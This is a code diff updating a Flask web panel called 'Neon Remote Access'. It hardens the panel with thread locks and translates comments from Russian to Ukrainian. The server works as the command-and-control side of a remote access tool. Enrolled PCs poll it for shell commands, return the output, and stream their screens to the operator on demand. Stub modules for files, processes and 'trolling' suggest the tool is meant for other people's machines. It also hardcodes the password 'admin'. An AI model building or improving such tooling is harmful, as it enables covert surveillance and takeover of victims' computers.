@@ -1,12 +1,14 @@
 import time
+import threading
 from flask import Flask, render_template_string, request, Response, jsonify, session, redirect, url_for
 
 app = Flask(__name__)
-app.secret_key = "super_secret_cyber_key" # Ключ для сессий
-PASSWORD = "admin" # Пароль для входа в панель
+app.secret_key = "super_secret_cyber_key"  # Ключ для сесій
+PASSWORD = "admin"  # Пароль для входу в панель
 
-# Словарь для хранения данных всех подключенных ПК
+# Словник для зберігання даних усіх ПК та Thread Lock для безпечної роботи з Gunicorn
 clients = {}
+clients_lock = threading.Lock()
 
 # ================= HTML ШАБЛОНЫ (Неоновый дизайн) =================
 
@@ -27,7 +29,6 @@ CSS_BASE = """
     }
     a { text-decoration: none; color: var(--neon); }
     
-    /* Боковое меню */
     .sidebar {
         position: fixed; top: 0; left: 0;
         width: 260px; height: 100vh;
@@ -48,14 +49,12 @@ CSS_BASE = """
         box-shadow: 0 0 10px rgba(0, 255, 208, 0.2);
     }
 
-    /* Основной контент */
     .main-content {
         margin-left: 260px;
         padding: 30px;
         min-height: 100vh;
     }
     
-    /* Карточки */
     .card {
         background: var(--panel);
         border: 1px solid var(--border);
@@ -65,7 +64,6 @@ CSS_BASE = """
         box-shadow: 0 4px 15px rgba(0,0,0,0.5);
     }
     
-    /* Элементы форм */
     input[type="text"], input[type="password"] {
         width: 100%; padding: 12px; margin: 10px 0;
         background: #071018; border: 1px solid var(--neon);
@@ -101,7 +99,7 @@ LOGIN_HTML = CSS_BASE + """
     <div class="title">Neon Remote Access</div>
     {% if error %}<div class="msg">{{ error }}</div>{% endif %}
     <form method="POST">
-        <input type="password" name="password" placeholder="Введите пароль админа..." required>
+        <input type="password" name="password" placeholder="Введіть пароль адміна..." required>
         <button type="submit" style="margin-top: 15px;">УВІЙТИ</button>
     </form>
 </div>
@@ -112,9 +110,9 @@ SIDEBAR_HTML = """
     <h2>Neon Control</h2>
     <div class="nav">
         <a href="/dashboard" class="active">🖥️ Дашборд (ПК)</a>
-        <a href="#" onclick="alert('Это заглушка. Модуль файлового менеджера не подключен.'); return false;">📁 Файли</a>
-        <a href="#" onclick="alert('Это заглушка. Модуль диспетчера задач не подключен.'); return false;">⚙️ Процеси</a>
-        <a href="#" onclick="alert('Это заглушка. Модуль троллинга (pranks) не подключен.'); return false;">🤡 Тролінг</a>
+        <a href="#" onclick="alert('Модуль файлового менеджера не подключен.'); return false;">📁 Файли</a>
+        <a href="#" onclick="alert('Модуль диспетчера задач не подключен.'); return false;">⚙️ Процеси</a>
+        <a href="#" onclick="alert('Модуль троллінгу не подключен.'); return false;">🤡 Тролінг</a>
         <a href="/logout" style="margin-top: 50px; border-color: #ff4d4d; color: #ff4d4d;">🚪 Вихід</a>
     </div>
 </div>
@@ -173,7 +171,7 @@ CONTROL_HTML = CSS_BASE + SIDEBAR_HTML + """
         </div>
         
         <div class="card cmd-container">
-            <h3 style="margin-top: 0;">⌨️ CMD (Командний рядок)</h3>
+            <h3 style="margin-top: 0;">⌨️️ CMD (Командний рядок)</h3>
             <form onsubmit="sendCommand(event)">
                 <input type="text" id="cmdInput" placeholder="Команда (dir, whoami, ipconfig...)" required autocomplete="off">
                 <button type="submit">Виконати команду</button>
@@ -184,7 +182,6 @@ CONTROL_HTML = CSS_BASE + SIDEBAR_HTML + """
 </div>
 
 <script>
-    // Скрипт для отправки команд и получения ответа без перезагрузки страницы
     function sendCommand(e) {
         e.preventDefault();
         const cmd = document.getElementById('cmdInput').value;
@@ -199,7 +196,6 @@ CONTROL_HTML = CSS_BASE + SIDEBAR_HTML + """
         document.getElementById('output').value = '⏳ Виконується...';
     }
 
-    // Автоматическое обновление окна вывода CMD каждые 1.5 секунды
     setInterval(() => {
         fetch('/api/get_output/{{ cid }}')
             .then(r => r.text())
@@ -208,7 +204,7 @@ CONTROL_HTML = CSS_BASE + SIDEBAR_HTML + """
                     const outbox = document.getElementById('output');
                     if (outbox.value !== txt) {
                         outbox.value = txt; 
-                        outbox.scrollTop = outbox.scrollHeight; // Автоскролл вниз
+                        outbox.scrollTop = outbox.scrollHeight;
                     }
                 }
             });
@@ -216,7 +212,7 @@ CONTROL_HTML = CSS_BASE + SIDEBAR_HTML + """
 </script>
 """
 
-# ================= МАРШРУТЫ WEB-ИНТЕРФЕЙСА =================
+# ================= МАРШРУТИ WEB-ІНТЕРФЕЙСУ =================
 
 @app.route("/", methods=["GET", "POST"])
 def login():
@@ -239,90 +235,122 @@ def logout():
 
 @app.route("/dashboard")
 def dashboard():
-    if not session.get("logged_in"): return redirect(url_for("login"))
+    if not session.get("logged_in"):
+        return redirect(url_for("login"))
     
     now = time.time()
     pc_list = []
-    for cid, data in list(clients.items()):
-        # Если ПК не выходил на связь больше 15 секунд — он оффлайн
-        is_online = (now - data["last_seen"]) < 15
+    
+    with clients_lock:
+        items = list(clients.items())
+        
+    for cid, data in items:
+        is_online = (now - data.get("last_seen", 0)) < 15
         pc_list.append({
             "id": cid,
-            "name": data["name"],
-            "ip": data["ip"],
+            "name": data.get("name", "Unknown"),
+            "ip": data.get("ip", "0.0.0.0"),
             "online": is_online
         })
     return render_template_string(DASHBOARD_HTML, pcs=pc_list)
 
 @app.route("/view/<cid>")
 def view_pc(cid):
-    if not session.get("logged_in"): return redirect(url_for("login"))
-    if cid not in clients: return redirect(url_for("dashboard"))
+    if not session.get("logged_in"):
+        return redirect(url_for("login"))
     
-    pc_name = clients[cid]["name"]
-    output = clients[cid]["output"]
+    with clients_lock:
+        if cid not in clients:
+            return redirect(url_for("dashboard"))
+        pc_name = clients[cid]["name"]
+        output = clients[cid]["output"]
+        
     return render_template_string(CONTROL_HTML, cid=cid, pc_name=pc_name, output=output)
 
 @app.route("/video_feed/<cid>")
 def video_feed(cid):
     def generate():
         while True:
-            if cid in clients:
-                # Обновляем время последнего просмотра страницы администратором
-                clients[cid]["last_viewed"] = time.time()
-                frame = clients[cid]["frame"]
-                if frame:
-                    yield (b'--frame\r\n'
-                           b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
+            frame = None
+            with clients_lock:
+                if cid in clients:
+                    clients[cid]["last_viewed"] = time.time()
+                    frame = clients[cid]["frame"]
+            
+            if frame:
+                yield (b'--frame\r\n'
+                       b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
             time.sleep(0.05)
+            
     return Response(generate(), mimetype='multipart/x-mixed-replace; boundary=frame')
 
-# ================= API ДЛЯ WEB-ПАНЕЛИ =================
+# ================= API ДЛЯ WEB-ПАНЕЛІ =================
 
 @app.route("/api/send_cmd/<cid>", methods=["POST"])
 def send_cmd(cid):
-    if not session.get("logged_in") or cid not in clients: return "Unauthorized", 401
-    clients[cid]["cmd"] = request.form.get("command", "")
-    return "OK", 200
+    if not session.get("logged_in"):
+        return "Unauthorized", 401
+    
+    with clients_lock:
+        if cid in clients:
+            clients[cid]["cmd"] = request.form.get("command", "")
+            return "OK", 200
+    return "Not Found", 404
 
 @app.route("/api/get_output/<cid>")
 def get_output(cid):
-    if not session.get("logged_in") or cid not in clients: return "", 401
-    return clients[cid]["output"]
+    if not session.get("logged_in"):
+        return "", 401
+    
+    with clients_lock:
+        if cid in clients:
+            return clients[cid]["output"]
+    return "", 404
 
-# ================= API ДЛЯ КЛИЕНТОВ (ПК, которыми управляем) =================
+# ================= API ДЛЯ КЛІЄНТІВ (ПК) =================
 
 @app.route("/api/heartbeat", methods=["POST"])
 def heartbeat():
-    data = request.json
+    data = request.json or {}
     cid = data.get("client_id")
+    if not cid:
+        return jsonify({"error": "No client_id"}), 400
     
-    if cid not in clients:
-        clients[cid] = {"name": data.get("name"), "last_viewed": 0, "frame": None, "cmd": "", "output": ""}
-    
-    clients[cid]["last_seen"] = time.time()
-    clients[cid]["ip"] = request.remote_addr
-    
-    # Определяем, нужно ли клиенту сейчас транслировать экран (если админ смотрит)
-    should_stream = (time.time() - clients[cid]["last_viewed"]) < 3
-    
-    cmd_to_run = clients[cid]["cmd"]
-    clients[cid]["cmd"] = "" # Очищаем после отправки
+    now = time.time()
+    with clients_lock:
+        if cid not in clients:
+            clients[cid] = {
+                "name": data.get("name", "Unknown PC"),
+                "last_viewed": 0,
+                "frame": None,
+                "cmd": "",
+                "output": ""
+            }
+        
+        clients[cid]["last_seen"] = now
+        clients[cid]["ip"] = request.remote_addr
+        
+        should_stream = (now - clients[cid]["last_viewed"]) < 3
+        cmd_to_run = clients[cid]["cmd"]
+        clients[cid]["cmd"] = ""
     
     return jsonify({"stream": should_stream, "cmd": cmd_to_run})
 
 @app.route("/api/upload_frame/<cid>", methods=["POST"])
 def upload_frame(cid):
-    if cid in clients:
-        clients[cid]["frame"] = request.data
-        clients[cid]["last_seen"] = time.time()
+    with clients_lock:
+        if cid in clients:
+            clients[cid]["frame"] = request.data
+            clients[cid]["last_seen"] = time.time()
     return "OK", 200
 
 @app.route("/api/post_output/<cid>", methods=["POST"])
 def post_output(cid):
-    if cid in clients:
-        clients[cid]["output"] = request.data.decode("utf-8", errors="ignore")
+    with clients_lock:
+        if cid in clients:
+            clients[cid]["output"] = request.data.decode("utf-8", errors="ignore")
     return "OK", 200
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5000)
+    # Локальний запуск для тестування (якщо запускати напряму через python app.py)
+    app.run(host="0.0.0.0", port=5000, threaded=True)
